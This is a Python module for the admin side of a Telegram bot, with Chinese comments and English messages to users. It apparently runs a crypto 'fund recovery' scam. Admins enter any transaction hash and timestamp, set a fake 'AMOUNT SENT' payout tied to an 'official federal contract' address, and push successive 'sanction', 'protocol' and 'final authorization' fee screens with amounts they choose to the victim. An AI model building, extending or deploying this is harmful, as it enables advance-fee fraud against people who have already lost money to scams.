"""
P9 进入后：向管理员推送 TX / P10–P12 费用配置（内联键盘），确认后写库并推送给用户。
P8 用户提交钱包后：管理员在同模块内编辑拨款金额 (USDT) 并推送 P9。
回调：adm|cmp|...
"""

from __future__ import annotations

import html
import re
from datetime import datetime
from io import BytesIO
from typing import Any

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, InputFile, Update
from telegram.ext import ContextTypes

import database as db
from .case_management_push import (
    admin_p6_recovery_summary,
    build_p10_sanction_push,
    build_p11_protocol_push,
    build_p12_final_auth_push,
    build_p9_disbursement_push,
    effective_cmp_overrides,
    format_cmp_fee_button_usd,
    merge_cmp_defaults,
    tronscan_url_for_tx_hash,
)
from .config import ADMIN_IDS
from .wallet_qr import wallet_address_to_qr_png

# 与 bot._CMP_P9_STATUSES 一致（避免循环 import）
_P9_STATUS_GROUP = frozenset({
    "P9", "P9 FUND DISBURSEMENT", "FUND DISBURSEMENT", "Fund Disbursement",
    "DISBURSEMENT AUTHORIZED", "DISBURSEMENT COMPLETE",
})


def _status_matches_p9(status: str | None) -> bool:
    s = (status or "").strip()
    if not s:
        return False
    su = s.upper()
    return su in {x.upper() for x in _P9_STATUS_GROUP}


async def _send_p9_wallet_qr_followup(
    ctx: ContextTypes.DEFAULT_TYPE, uid: int, m: dict
) -> None:
    """P9 文本消息发出后，若有在案钱包地址则跟发一张二维码图（失败则静默跳过）。"""
    wal = str(m.get("p8_submitted_wallet") or "").strip()
    if not wal:
        return
    png = wallet_address_to_qr_png(wal)
    if not png:
        return
    try:
        await ctx.bot.send_photo(
            int(uid),
            photo=InputFile(BytesIO(png), filename="wallet_qr.png"),
            parse_mode="HTML",
            caption=(
                "📱 <b>Destination wallet (QR)</b>\n\n"
                f"<code>{html.escape(wal)}</code>\n\n"
                "<i>Same address as in the disbursement message above.</i>"
            ),
        )
    except Exception:
        pass


def _overrides_dict(case_row: dict | None) -> dict:
    raw = (case_row or {}).get("case_cmp_overrides") or {}
    if isinstance(raw, str):
        import json
        try:
            raw = json.loads(raw)
        except Exception:
            raw = {}
    return raw if isinstance(raw, dict) else {}


def raw_case_cmp_overrides(case_row: dict | None) -> dict:
    """仅数据库中的 overrides（不含默认合并），供判断是否由管理员写入等。"""
    return dict(_overrides_dict(case_row))


def _valid_tron_trc20_address(s: str) -> bool:
    a = (s or "").strip()
    if len(a) != 34 or not a.startswith("T"):
        return False
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    return all(ch in alphabet for ch in a[1:])


def _pipeline_already_sent(case_row: dict | None) -> bool:
    o = _overrides_dict(case_row)
    return bool(o.get("p9_admin_pipeline_sent"))


def _fmt_p10_only_block(m: dict) -> str:
    """仅 P10 分项 + 小计（用于 P8 管理台预览）。"""
    lines: list[str] = []
    p10 = m.get("p10_items") or []
    for i, it in enumerate(p10, 1):
        if isinstance(it, (list, tuple)) and len(it) >= 2:
            lines.append(f"  {i}. {it[0]} — <code>${float(it[1]):,.2f}</code>")
    if not lines:
        lines.append("  <i>（无分项）</i>")
    lines.append(f"  <b>P10 小计</b> <code>${format_cmp_fee_button_usd(p10)}</code>")
    return "\n".join(lines)


def _fmt_admin_fee_block(m: dict) -> str:
    lines = ["<b>P10</b>"]
    p10 = m.get("p10_items") or []
    for i, it in enumerate(p10, 1):
        if isinstance(it, (list, tuple)) and len(it) >= 2:
            lines.append(f"  {i}. {it[0]} — <code>${float(it[1]):,.2f}</code>")
    lines.append(f"  <b>小计</b> <code>${format_cmp_fee_button_usd(p10)}</code>")
    lines.append("")
    lines.append("<b>P11</b>")
    p11 = m.get("p11_items") or []
    for i, it in enumerate(p11, 1):
        if isinstance(it, (list, tuple)) and len(it) >= 2:
            lines.append(f"  {i}. {it[0]} — <code>${float(it[1]):,.2f}</code>")
    lines.append(f"  <b>小计</b> <code>${format_cmp_fee_button_usd(p11)}</code>")
    lines.append("")
    lines.append("<b>P12</b>")
    p12 = m.get("p12_items") or []
    for i, it in enumerate(p12, 1):
        if isinstance(it, (list, tuple)) and len(it) >= 2:
            lines.append(f"  {i}. {it[0]} — <code>${float(it[1]):,.2f}</code>")
    lines.append(f"  <b>小计</b> <code>${format_cmp_fee_button_usd(p12)}</code>")
    return "\n".join(lines)


def _kb_p9_admin(case_no: str, m: dict) -> InlineKeyboardMarkup:
    tx = str(m.get("p9_tx_hash") or "")
    url = str(m.get("p9_tronscan_url") or "") or tronscan_url_for_tx_hash(tx)
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔗 View Transaction on TronScan", url=url)],
        [
            InlineKeyboardButton("✏️ 编辑 TX / 时间", callback_data=f"adm|cmp|p9|txedit|{case_no}"),
            InlineKeyboardButton("📤 确认并推送 P9 给用户", callback_data=f"adm|cmp|p9|push|{case_no}"),
        ],
    ])


def _kb_fees_admin(case_no: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✏️ 编辑费用", callback_data=f"adm|cmp|fees|edit|{case_no}"),
            InlineKeyboardButton("📤 确认并推送 P10–P12", callback_data=f"adm|cmp|fees|push|{case_no}"),
        ],
        [
            InlineKeyboardButton("✏️ 仅编辑 P11 金额", callback_data=f"adm|cmp|fees|p11edit|{case_no}"),
            InlineKeyboardButton("📤 仅推送 P11", callback_data=f"adm|cmp|fees|p11push|{case_no}"),
        ],
    ])


def _kb_p8_disburse_admin(case_no: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "✏️ 设置发放金额 (USDT)",
                    callback_data=f"adm|cmp|p8|amtedit|{case_no}",
                ),
            ],
            [
                InlineKeyboardButton(
                    "📜 设置 P9 合约地址",
                    callback_data=f"adm|cmp|p8|ctredit|{case_no}",
                ),
            ],
            [
                InlineKeyboardButton(
                    "✏️ 设置 P10 收款金额",
                    callback_data=f"adm|cmp|p8|p10edit|{case_no}",
                ),
            ],
            [
                InlineKeyboardButton(
                    "📤 推送 P9 给用户",
                    callback_data=f"adm|cmp|p8|p9push|{case_no}",
                ),
            ],
        ]
    )


def _fmt_p8_admin_panel(
    case_no: str, wallet: str, tg_uid: str, m: dict, case_row: dict | None
) -> str:
    fin = admin_p6_recovery_summary(case_row, case_no)
    amt = m.get("p9_disbursement_amount_usd")
    amt_s = "<i>（未设置 — P9 到帐金额将不可用）</i>"
    if amt is not None and str(amt).strip() != "":
        try:
            amt_s = f"<code>${float(amt):,.2f} USDT</code> <i>（用户 P9 展示）</i>"
        except (TypeError, ValueError):
            pass
    raw_o = _overrides_dict(case_row)
    admin_contract = bool(raw_o.get("p9_federal_contract_by_admin"))
    caddr = str(m.get("p9_federal_contract_address") or "").strip()
    if admin_contract and caddr:
        contract_s = f"<code>{html.escape(caddr)}</code>"
    else:
        contract_s = "<i>（未设置 — 用户 Copy 合约按钮不可用，推送前必填）</i>"

    p10_prev = _fmt_p10_only_block(m)

    return (
        "📌 <b>P8 · 钱包已确认 — P9 / P10 配置台</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"案件：<code>{html.escape(case_no)}</code>\n"
        f"用户 TG：<code>{html.escape(str(tg_uid))}</code>\n\n"
        "<b>1. 非托管钱包（用户提交）</b>\n"
        f"<code>{html.escape(wallet)}</code>\n\n"
        "<b>2. 用户报案总金额 (User Reported Loss)</b>\n"
        f"<code>{html.escape(fin['reported_loss'])}</code>\n\n"
        "<b>3. P6 系统 Remission Rate</b>\n"
        f"<code>{html.escape(fin['remission_rate'])}</code>\n\n"
        "<b>4. P6 CALCULATED RECOVERY AMOUNT</b>\n"
        f"<code>{html.escape(fin['calculated_recovery'])}</code>\n\n"
        "<b>5. 管理员发放金额 → P9 AMOUNT SENT</b>\n"
        f"{amt_s}\n\n"
        "<b>6. P9 联邦合约地址（用户 Copy 按钮）</b>\n"
        f"{contract_s}\n\n"
        "<b>7. P10 收款金额（用户端 P10 支付合计 / 分项）</b>\n"
        f"{p10_prev}\n\n"
        "<i>P10 推送给用户的时机将按后续规则触发；此处仅预存金额。</i>\n\n"
        "请先 <b>设置发放金额</b> 与 <b>合约地址</b>，再推送 P9。"
    )


def _parse_disburse_amount_usd(text: str) -> float | None:
    raw = (text or "").strip().replace("$", "").replace("USDT", "").replace("usdt", "")
    if not raw:
        return None
    try:
        return float(re.sub(r"[^\d.\-]", "", raw))
    except ValueError:
        return None


async def notify_p8_wallet_pending_p9(
    ctx: ContextTypes.DEFAULT_TYPE,
    case_no: str,
    wallet_addr: str,
    user_tg_id: int,
) -> None:
    """用户 P8 提交钱包后：写库并向各管理员发内联键盘（仅 p8wal 流程调用）。"""
    cn = (case_no or "").strip().upper()
    if not cn or not wallet_addr:
        return
    ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S") + " UTC"
    await db.merge_case_cmp_overrides(
        cn,
        {
            "p8_submitted_wallet": wallet_addr.strip(),
            "p8_wallet_submitted_at_utc": ts,
        },
    )
    c = await db.get_case_by_no(cn)
    m = effective_cmp_overrides(c)
    body = _fmt_p8_admin_panel(cn, wallet_addr.strip(), str(user_tg_id), m, c)
    for aid in ADMIN_IDS:
        try:
            await ctx.bot.send_message(
                aid, body, parse_mode="HTML", reply_markup=_kb_p8_disburse_admin(cn)
            )
        except Exception:
            pass


async def on_case_entered_p9(ctx: ContextTypes.DEFAULT_TYPE, case_no: str, old_status: str | None, new_status: str | None) -> None:
    """首次进入 P9 时向所有管理员发两条配置消息（每管理员各两条）。"""
    if not _status_matches_p9(new_status):
        return
    if _status_matches_p9(old_status):
        return
    c = await db.get_case_by_no(case_no)
    if not c:
        return
    if _pipeline_already_sent(c):
        return
    m = effective_cmp_overrides(c)
    tx = str(m.get("p9_tx_hash") or "")
    ts = str(m.get("p9_tx_timestamp_utc") or "")
    body_tx = (
        "📌 <b>P9 · 拨款展示配置</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"案件：<code>{case_no}</code>\n"
        f"当前 <b>TX Hash</b>：\n<code>{tx}</code>\n"
        f"<b>UTC 时间</b>：<code>{ts}</code>\n\n"
        "先修改或直接推送给用户。用户端为英文界面。"
    )
    body_fees = (
        "📌 <b>P10 / P11 / P12 · 费用配置</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"案件：<code>{case_no}</code>\n\n"
        + _fmt_admin_fee_block(m)
        + "\n\n确认后将连发三条英文收费界面给用户。"
    )
    sent_ok = False
    for aid in ADMIN_IDS:
        try:
            await ctx.bot.send_message(aid, body_tx, parse_mode="HTML", reply_markup=_kb_p9_admin(case_no, m))
            await ctx.bot.send_message(aid, body_fees, parse_mode="HTML", reply_markup=_kb_fees_admin(case_no))
            sent_ok = True
        except Exception:
            pass
    if sent_ok:
        await db.merge_case_cmp_overrides(case_no, {"p9_admin_pipeline_sent": True})


def _parse_tx_input(text: str) -> dict[str, Any] | None:
    raw = (text or "").strip()
    if not raw:
        return None
    lines = [ln.strip() for ln in raw.splitlines() if ln.strip()]
    if len(lines) >= 2:
        return {"p9_tx_hash": lines[0], "p9_tx_timestamp_utc": lines[1]}
    return {"p9_tx_hash": lines[0], "p9_tx_timestamp_utc": None}


def _parse_p10_line_input(text: str, merged_m: dict) -> dict[str, Any] | None:
    """单行金额，空格或逗号分隔，个数须与当前 p10_items 一致；分项名称沿用库里模板。"""
    raw = (text or "").strip()
    if not raw:
        return None
    parts = [p.strip() for p in raw.replace(",", " ").split() if p.strip()]
    nums: list[float] = []
    for p in parts:
        try:
            nums.append(float(re.sub(r"[^\d.\-]", "", p)))
        except ValueError:
            return None
    p10b = merged_m.get("p10_items") or []
    if not p10b or len(nums) != len(p10b):
        return None
    return {
        "p10_items": [[str(p10b[i][0]), nums[i]] for i in range(len(nums))],
    }


def _parse_p11_line_input(text: str, merged_m: dict) -> dict[str, Any] | None:
    """单行金额，空格或逗号分隔，个数须与当前 p11_items 一致；分项名称沿用库内模板。"""
    raw = (text or "").strip()
    parts = [p.strip() for p in raw.replace(",", " ").split() if p.strip()]
    nums: list[float] = []
    for p in parts:
        try:
            nums.append(float(re.sub(r"[^\d.\-]", "", p)))
        except ValueError:
            return None
    p11b = merged_m.get("p11_items") or []
    if not p11b or len(nums) != len(p11b):
        return None
    return {
        "p11_items": [[str(p11b[i][0]), nums[i]] for i in range(len(nums))],
    }


def _parse_fees_pipe_input(text: str, base: dict) -> dict[str, Any] | None:
    """
    单行：a,b,c|d,e|f,g 对应 P10 3 项、P11 2 项、P12 2 项金额（标签沿用默认）。
    """
    raw = (text or "").strip()
    if not raw:
        return None
    segs = raw.split("|")
    if len(segs) != 3:
        return None

    def nums(s: str) -> list[float] | None:
        parts = [p.strip() for p in s.replace(",", " ").split() if p.strip()]
        out: list[float] = []
        for p in parts:
            try:
                out.append(float(re.sub(r"[^\d.\-]", "", p)))
            except ValueError:
                return None
        return out

    n10, n11, n12 = nums(segs[0]), nums(segs[1]), nums(segs[2])
    if not n10 or not n11 or not n12:
        return None
    b = merge_cmp_defaults(base)
    p10b, p11b, p12b = b.get("p10_items") or [], b.get("p11_items") or [], b.get("p12_items") or []
    if len(n10) != len(p10b) or len(n11) != len(p11b) or len(n12) != len(p12b):
        return None
    patch: dict[str, Any] = {}
    patch["p10_items"] = [[str(p10b[i][0]), n10[i]] for i in range(len(n10))]
    patch["p11_items"] = [[str(p11b[i][0]), n11[i]] for i in range(len(n11))]
    patch["p12_items"] = [[str(p12b[i][0]), n12[i]] for i in range(len(n12))]
    return patch


async def handle_admin_text_cmp_states(update: Update, ctx: ContextTypes.DEFAULT_TYPE, state: str, text: str) -> bool:
    """在 msg_handler 中调用；已处理返回 True。"""
    if state == "ADM_CMP_EDIT_P9TX":
        case_no = ctx.user_data.pop("adm_cmp_case", None)
        ctx.user_data["state"] = None
        if not case_no:
            await update.message.reply_text("❌ 会话已过期。")
            return True
        parsed = _parse_tx_input(text)
        if not parsed:
            await update.message.reply_text("❌ 格式无效。请重试。")
            return True
        patch: dict[str, Any] = {"p9_tx_hash": parsed["p9_tx_hash"]}
        if parsed.get("p9_tx_timestamp_utc"):
            patch["p9_tx_timestamp_utc"] = parsed["p9_tx_timestamp_utc"]
        await db.merge_case_cmp_overrides(case_no, patch)
        c = await db.get_case_by_no(case_no)
        m = effective_cmp_overrides(c)
        await update.message.reply_text(
            "✅ 已保存。可再次打开后台消息点击「确认并推送」，或继续编辑。",
            parse_mode="HTML",
            reply_markup=_kb_p9_admin(case_no, m),
        )
        return True

    if state == "ADM_CMP_EDIT_FEES":
        case_no = ctx.user_data.pop("adm_cmp_case", None)
        ctx.user_data["state"] = None
        if not case_no:
            await update.message.reply_text("❌ 会话已过期。")
            return True
        c = await db.get_case_by_no(case_no)
        base = effective_cmp_overrides(c)
        patch = _parse_fees_pipe_input(text, base)
        if not patch:
            await update.message.reply_text(
                "❌ 格式无效。\n"
                "请发 <b>一行</b>，用 <code>|</code> 分三段，对应 P10/P11/P12 的金额（空格或逗号分隔），\n"
                "段内数量须与当前默认一致（P10/P11/P12 各段个数与后台默认分项一致）。\n"
                "例：<code>1500,800|400,200|200,50</code>",
                parse_mode="HTML",
            )
            return True
        await db.merge_case_cmp_overrides(case_no, patch)
        c2 = await db.get_case_by_no(case_no)
        m = effective_cmp_overrides(c2)
        await update.message.reply_text(
            "✅ 费用已保存。\n" + _fmt_admin_fee_block(m),
            parse_mode="HTML",
            reply_markup=_kb_fees_admin(case_no),
        )
        return True

    if state == "ADM_CMP_EDIT_P11_FEES":
        case_no = ctx.user_data.pop("adm_cmp_case", None)
        ctx.user_data["state"] = None
        if not case_no:
            await update.message.reply_text("❌ 会话已过期。")
            return True
        c = await db.get_case_by_no(case_no)
        if not c:
            await update.message.reply_text("❌ 案件不存在。")
            return True
        base = effective_cmp_overrides(c)
        patch = _parse_p11_line_input(text, base)
        if not patch:
            p11b = base.get("p11_items") or []
            n = len(p11b)
            await update.message.reply_text(
                "❌ 格式无效。\n"
                f"当前 P11 共 <b>{n}</b> 个分项，请发 <b>一行</b> 数字（空格或逗号分隔），"
                "名称沿用后台模板，仅改金额。\n"
                "例：<code>400, 200</code>",
                parse_mode="HTML",
            )
            return True
        await db.merge_case_cmp_overrides(case_no, patch)
        c2 = await db.get_case_by_no(case_no)
        m = effective_cmp_overrides(c2)
        await update.message.reply_text(
            "✅ <b>P11 金额已写入</b>（用户端 FEE BREAKDOWN 将显示此数据）。\n"
            + _fmt_admin_fee_block(m),
            parse_mode="HTML",
            reply_markup=_kb_fees_admin(case_no),
        )
        return True

    if state == "ADM_CMP_EDIT_P8_AMT":
        case_no = ctx.user_data.pop("adm_cmp_case", None)
        ctx.user_data["state"] = None
        if not case_no:
            await update.message.reply_text("❌ 会话已过期。")
            return True
        val = _parse_disburse_amount_usd(text)
        if val is None or val < 0:
            await update.message.reply_text(
                "❌ 无效金额。请发一行数字，例：<code>12500.50</code> 或 <code>$12,500</code>",
                parse_mode="HTML",
            )
            return True
        await db.merge_case_cmp_overrides(case_no, {"p9_disbursement_amount_usd": val})
        c = await db.get_case_by_no(case_no)
        m = effective_cmp_overrides(c)
        wal = str(m.get("p8_submitted_wallet") or "—")
        await update.message.reply_text(
            f"✅ 已保存拨款金额 <code>${val:,.2f} USDT</code>。\n"
            f"钱包：<code>{wal}</code>\n\n"
            "此金额将显示在用户 P9 <b>AMOUNT SENT</b>。可继续设置合约或推送 P9。",
            parse_mode="HTML",
            reply_markup=_kb_p8_disburse_admin(case_no),
        )
        return True

    if state == "ADM_CMP_EDIT_P8_CONTRACT":
        case_no = ctx.user_data.pop("adm_cmp_case", None)
        ctx.user_data["state"] = None
        if not case_no:
            await update.message.reply_text("❌ 会话已过期。")
            return True
        line = (text or "").strip()
        if not _valid_tron_trc20_address(line):
            await update.message.reply_text(
                "❌ 无效地址。请发 <b>一行</b> TRC-20 合约地址（<code>T</code> 开头，34 位）。",
                parse_mode="HTML",
            )
            return True
        await db.merge_case_cmp_overrides(
            case_no,
            {
                "p9_federal_contract_address": line,
                "p9_federal_contract_by_admin": True,
            },
        )
        c = await db.get_case_by_no(case_no)
        m = effective_cmp_overrides(c)
        wal = str(m.get("p8_submitted_wallet") or "—")
        await update.message.reply_text(
            "✅ 已保存 <b>P9 合约地址</b>（用户点 Copy 将显示此地址）。\n\n"
            f"<code>{html.escape(line)}</code>\n\n"
            f"钱包：<code>{wal}</code>\n\n"
            "设置发放金额后可推送 P9。",
            parse_mode="HTML",
            reply_markup=_kb_p8_disburse_admin(case_no),
        )
        return True

    if state == "ADM_CMP_EDIT_P8_P10":
        case_no = ctx.user_data.pop("adm_cmp_case", None)
        ctx.user_data["state"] = None
        if not case_no:
            await update.message.reply_text("❌ 会话已过期。")
            return True
        c = await db.get_case_by_no(case_no)
        merged_before = effective_cmp_overrides(c)
        patch = _parse_p10_line_input(text, merged_before)
        if not patch:
            n = len(merged_before.get("p10_items") or [])
            await update.message.reply_text(
                "❌ 格式无效。\n"
                f"当前 P10 共 <b>{n}</b> 个分项，请发 <b>一行</b>，用空格或逗号分隔数字，"
                "个数须一致（分项名称不变，仅改金额）。\n"
                "例：若当前为 2 项：<code>1500 800</code> 或 <code>1500,800</code>",
                parse_mode="HTML",
            )
            return True
        await db.merge_case_cmp_overrides(case_no, patch)
        c2 = await db.get_case_by_no(case_no)
        m = effective_cmp_overrides(c2)
        await update.message.reply_text(
            "✅ <b>P10 收款金额</b>已写入案件。\n\n"
            + _fmt_p10_only_block(m)
            + "\n\n<i>用户端 P10 按钮金额与明细将使用上述配置；推送时机稍后随规则触发。</i>",
            parse_mode="HTML",
            reply_markup=_kb_p8_disburse_admin(case_no),
        )
        return True

    return False


async def handle(data: str, update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> bool:
    """adm|cmp|... 返回 True 表示已处理。"""
    parts = data.split("|")
    if len(parts) < 4 or parts[0] != "adm" or parts[1] != "cmp":
        return False
    q = update.callback_query
    # q.answer() 由 admin_console 已调用
    branch = parts[2]
    case_no = parts[-1]
    if not case_no:
        return True

    if branch == "p9":
        sub = parts[3] if len(parts) > 3 else ""
        c = await db.get_case_by_no(case_no)
        if not c:
            await q.message.reply_text("❌ 案件不存在。", parse_mode="HTML")
            return True
        m = effective_cmp_overrides(c)
        if sub == "txedit":
            ctx.user_data["state"] = "ADM_CMP_EDIT_P9TX"
            ctx.user_data["adm_cmp_case"] = case_no
            await q.message.reply_text(
                "✏️ <b>编辑 P9 展示</b>\n\n"
                "请回复：\n"
                "• <b>一行</b>：仅 TX Hash；或\n"
                "• <b>两行</b>：第一行 TX Hash，第二行 UTC 时间（如 <code>2026-03-16 14:30:00 UTC</code>）。",
                parse_mode="HTML",
            )
            return True
        if sub == "push":
            uid = c.get("tg_user_id")
            if uid is None:
                await q.message.reply_text("❌ 无用户 TG ID。", parse_mode="HTML")
                return True
            body, kb = build_p9_disbursement_push(case_no, m)
            try:
                await ctx.bot.send_message(int(uid), body, parse_mode="HTML", reply_markup=kb)
            except Exception as e:
                await q.message.reply_text(f"❌ 推送失败：{e}", parse_mode="HTML")
                return True
            await _send_p9_wallet_qr_followup(ctx, int(uid), m)
            await q.message.reply_text(f"✅ 已向用户推送 P9：<code>{case_no}</code>", parse_mode="HTML")
            return True
        return True

    if branch == "fees":
        sub = parts[3] if len(parts) > 3 else ""
        c = await db.get_case_by_no(case_no)
        if not c:
            await q.message.reply_text("❌ 案件不存在。", parse_mode="HTML")
            return True
        m = effective_cmp_overrides(c)
        if sub == "edit":
            ctx.user_data["state"] = "ADM_CMP_EDIT_FEES"
            ctx.user_data["adm_cmp_case"] = case_no
            await q.message.reply_text(
                "✏️ <b>编辑 P10–P12 金额</b>\n\n"
                "回复 <b>一行</b>：<code>P10金额组|P11金额组|P12金额组</code>\n"
                "例：<code>1500,800|400,200|200,50</code>\n"
                "（分项名称不变，仅改数字；段内个数须与当前默认一致。）",
                parse_mode="HTML",
            )
            return True
        if sub == "push":
            uid = c.get("tg_user_id")
            if uid is None:
                await q.message.reply_text("❌ 无用户 TG ID。", parse_mode="HTML")
                return True
            try:
                b10, kb10 = build_p10_sanction_push(case_no, m, c)
                await ctx.bot.send_message(int(uid), b10, parse_mode="HTML", reply_markup=kb10)
                b11, kb11 = build_p11_protocol_push(case_no, c)
                await ctx.bot.send_message(int(uid), b11, parse_mode="HTML", reply_markup=kb11)
                b12, kb12 = build_p12_final_auth_push(case_no, m)
                await ctx.bot.send_message(int(uid), b12, parse_mode="HTML", reply_markup=kb12)
            except Exception as e:
                await q.message.reply_text(f"❌ 推送失败：{e}", parse_mode="HTML")
                return True
            await q.message.reply_text(
                f"✅ 已向用户连发 P10 / P11 / P12：<code>{case_no}</code>",
                parse_mode="HTML",
            )
            return True
        if sub == "p11edit":
            ctx.user_data["state"] = "ADM_CMP_EDIT_P11_FEES"
            ctx.user_data["adm_cmp_case"] = case_no
            p11 = m.get("p11_items") or []
            lines = []
            for i, it in enumerate(p11, 1):
                if isinstance(it, (list, tuple)) and len(it) >= 2:
                    lines.append(f"  {i}. {html.escape(str(it[0]))} — <code>${float(it[1]):,.2f}</code>")
            prev = "\n".join(lines) if lines else "  <i>（无）</i>"
            await q.message.reply_text(
                "✏️ <b>仅编辑 P11 金额</b>\n\n"
                "<b>当前分项</b>（名称不变，仅改数字）：\n"
                f"{prev}\n\n"
                f"请回复 <b>一行</b>，共 <b>{len(p11)}</b> 个数字，空格或逗号分隔。",
                parse_mode="HTML",
            )
            return True
        if sub == "p11push":
            uid = c.get("tg_user_id")
            if uid is None:
                await q.message.reply_text("❌ 无用户 TG ID。", parse_mode="HTML")
                return True
            try:
                b11, kb11 = build_p11_protocol_push(case_no, c)
                await ctx.bot.send_message(int(uid), b11, parse_mode="HTML", reply_markup=kb11)
            except Exception as e:
                await q.message.reply_text(f"❌ 推送失败：{e}", parse_mode="HTML")
                return True
            await q.message.reply_text(
                f"✅ 已向用户推送 P11（金额来自当前库内 <code>p11_items</code>）：<code>{case_no}</code>",
                parse_mode="HTML",
            )
            return True
        return True

    if branch == "p8":
        sub = parts[3] if len(parts) > 3 else ""
        c = await db.get_case_by_no(case_no)
        if not c:
            await q.message.reply_text("❌ 案件不存在。", parse_mode="HTML")
            return True
        m = effective_cmp_overrides(c)
        if sub == "amtedit":
            ctx.user_data["state"] = "ADM_CMP_EDIT_P8_AMT"
            ctx.user_data["adm_cmp_case"] = case_no
            await q.message.reply_text(
                "✏️ <b>管理员发放金额 (USDT)</b>\n\n"
                "将显示在用户 P9 的 <b>AMOUNT SENT</b>。\n"
                "请回复 <b>一行</b> 数字，例：<code>48291.00</code> 或 <code>$48,291</code>",
                parse_mode="HTML",
            )
            return True
        if sub == "ctredit":
            ctx.user_data["state"] = "ADM_CMP_EDIT_P8_CONTRACT"
            ctx.user_data["adm_cmp_case"] = case_no
            await q.message.reply_text(
                "📜 <b>P9 · 联邦合约地址</b>\n\n"
                "用户端 <b>COPY OFFICIAL CONTRACT ADDRESS</b> 将显示此地址。\n"
                "请回复 <b>一行</b> TRC-20 合约地址（<code>T</code> 开头，34 位）。\n"
                "例：官方 USDT 合约 <code>TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code>",
                parse_mode="HTML",
            )
            return True
        if sub == "p10edit":
            ctx.user_data["state"] = "ADM_CMP_EDIT_P8_P10"
            ctx.user_data["adm_cmp_case"] = case_no
            p10 = m.get("p10_items") or []
            preview_lines = []
            for i, it in enumerate(p10, 1):
                if isinstance(it, (list, tuple)) and len(it) >= 2:
                    preview_lines.append(
                        f"{i}. {html.escape(str(it[0]))} — 当前 <code>${float(it[1]):,.2f}</code>"
                    )
            prev_body = "\n".join(preview_lines) if preview_lines else "<i>（无分项）</i>"
            ex_parts = []
            for it in p10:
                if isinstance(it, (list, tuple)) and len(it) >= 2:
                    ex_parts.append(f"{float(it[1]):g}")
            ex_line = ",".join(ex_parts) if ex_parts else "1500,800"
            await q.message.reply_text(
                "✏️ <b>P10 收款金额</b>\n\n"
                "以下分项名称不变，仅修改金额（写入 <code>case_cmp_overrides.p10_items</code>）。\n\n"
                f"{prev_body}\n\n"
                f"请回复 <b>一行</b>，共 <b>{len(p10)}</b> 个数字，空格或逗号分隔。\n"
                f"例：<code>{ex_line}</code>",
                parse_mode="HTML",
            )
            return True
        if sub == "p9push":
            uid = c.get("tg_user_id")
            if uid is None:
                await q.message.reply_text("❌ 无用户 TG ID。", parse_mode="HTML")
                return True
            amt_ok = m.get("p9_disbursement_amount_usd")
            try:
                if amt_ok is None or float(amt_ok) <= 0:
                    raise ValueError
            except (TypeError, ValueError):
                await q.message.reply_text(
                    "❌ 请先用 <b>设置发放金额</b> 填写大于 0 的 USDT（用户 P9 到帐金额）。",
                    parse_mode="HTML",
                )
                return True
            raw_o = _overrides_dict(c)
            if not raw_o.get("p9_federal_contract_by_admin"):
                await q.message.reply_text(
                    "❌ 请先用 <b>设置 P9 合约地址</b> 保存一行合约地址，再推送 P9。",
                    parse_mode="HTML",
                )
                return True
            old_st = c.get("status")
            ok = await db.update_case_status(
                case_no,
                "DISBURSEMENT AUTHORIZED",
                "auto_progress",
                "admin P9 push after P8 wallet",
            )
            if not ok:
                await q.message.reply_text("❌ 更新案件状态失败。", parse_mode="HTML")
                return True
            m2 = effective_cmp_overrides(await db.get_case_by_no(case_no))
            body, kb = build_p9_disbursement_push(case_no, m2)
            try:
                await ctx.bot.send_message(int(uid), body, parse_mode="HTML", reply_markup=kb)
            except Exception as e:
                await q.message.reply_text(f"❌ 推送用户失败：{e}", parse_mode="HTML")
                return True
            await _send_p9_wallet_qr_followup(ctx, int(uid), m2)
            await q.message.reply_text(
                f"✅ 已向用户推送 P9，状态已设为 DISBURSEMENT AUTHORIZED：<code>{case_no}</code>",
                parse_mode="HTML",
            )
            await on_case_entered_p9(ctx, case_no, old_st, "DISBURSEMENT AUTHORIZED")
            return True
        return True

    return False
